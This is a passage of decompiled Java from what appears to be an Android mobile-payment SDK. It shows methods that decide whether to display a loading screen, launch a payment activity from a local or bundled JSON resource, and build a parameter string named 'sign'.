    //   363	370	355	java/lang/IllegalStateException
    //   0	316	373	java/io/IOException
    //   316	321	373	java/io/IOException
    //   325	331	373	java/io/IOException
    //   344	352	373	java/io/IOException
    //   363	370	373	java/io/IOException
  }
  
  public boolean showLoading(String paramString)
  {
    Object localObject = UpayCore.getInstance(this.mContext).getPropString("common", "not_show_loading", "");
    if (!Util.empty((String)localObject))
    {
      localObject = ((String)localObject).split("&");
      int i = 0;
      while (i < localObject.length)
      {
        if (paramString.equals(localObject[i])) {
          return false;
        }
        i += 1;
      }
    }
    return true;
  }
  
  public void showProgressUi(Plan paramPlan, Trade paramTrade, String paramString1, String paramString2)
  {
    paramPlan = paramPlan.getLocalResourcePath(paramString1);
    if ((paramPlan != null) && (new File(paramPlan).exists())) {}
    for (paramPlan = Util.loadLocalText(paramPlan);; paramPlan = Util.loadAssetsText(this.mContext, paramString1 + ".json"))
    {
      UpayActivity.start(this.mContext, paramString1, paramPlan, 0, new ZcWapPayTask.1(this, paramTrade, paramString2));
      return;
    }
  }
  
  public String sign(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    return "app=" + paramString1 + "&pid=" + paramString2 + "&time=" + paramString3 + "&key=" + paramString4;
  }
}
